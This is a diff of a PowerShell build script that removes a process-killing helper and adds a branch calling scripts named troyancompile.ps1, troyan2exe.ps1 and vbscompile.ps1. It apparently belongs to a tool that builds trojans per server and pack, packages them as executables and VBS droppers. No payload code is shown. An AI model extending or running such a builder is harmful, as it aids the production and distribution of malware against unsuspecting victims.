@@ -1,5 +1,5 @@
 param (
-    [string]$serverName, [string]$action = "apply", [string]$kill="kill", [string]$refiner
+    [string]$serverName, [string]$action = "apply", [string]$packId = ""
 )
 
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
@@ -14,48 +14,6 @@ if ($serverName -eq "") {
 if ([string]::IsNullOrEmpty($serverName))
 {
     throw "compile.ps1 -serverName argument is null"
-}
-
-$currentScriptPath = $PSScriptRoot
-
-if (-not (Test-Path "C:\data"))
-{
-    New-Item -Path "C:\data" -ItemType Directory -Force
-}
-
-
-
-if ($refiner -ne "refiner")
-{
-    $refinerPath = Join-Path -Path $currentScriptPath -ChildPath "../Refiner/bin/debug/net9.0/Refiner.exe"
-    if (Test-Path $refinerPath) {
-        & $refinerPath $serverName "none"
-    } else {
-        Write-Error "The light file '$refinerPath' does not exist."
-    }
-}
-
-function Kill-TaskByName {
-    param (
-        [string]$TaskName
-    )
-    $processes = Get-Process | Where-Object { $_.Name -like "*$TaskName*" }
-    if ($processes) {
-        foreach ($process in $processes) {
-            try {
-                Stop-Process -Id $process.Id -Force
-                Write-Host "Killed process: $($process.Name) (ID: $($process.Id))"
-            } catch {
-                Write-Host "Failed to kill process: $($process.Name) (ID: $($process.Id)) - $_"
-            }
-        }
-    } else {
-        Write-Host "No processes found matching '$TaskName'."
-    }
-}
-if ($kill -eq "kill" -and $refiner -ne "refiner")
-{
-    Kill-TaskByName -TaskName "Refiner"
 }
 
 #currents
@@ -74,6 +32,23 @@ if ([string]::IsNullOrEmpty($hep) -eq $false)
     if (Test-Path -Path $folderPath) {
         Remove-Item "$folderPath\*" -Recurse -Force
     }
+}
+
+if ([string]::IsNullOrEmpty($packId) -eq $false)
+{
+    $pack = $server.pack.items | Where-Object { $_.index -eq $packId }
+    if (-not $pack) {
+        throw "Item with index '$packId' not found in pack items."
+    }
+    #general script
+    & (Join-Path -Path $server.troyanDir -ChildPath "./troyancompile.ps1") -serverName $serverName -packId $packId
+
+    #general script to exe
+    & (Join-Path -Path $server.troyanDir -ChildPath "./troyan2exe.ps1") -serverName $serverName -packId $packId
+
+    #vbs
+    & (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName -packId $packId
+    exit
 }
 
 #cert
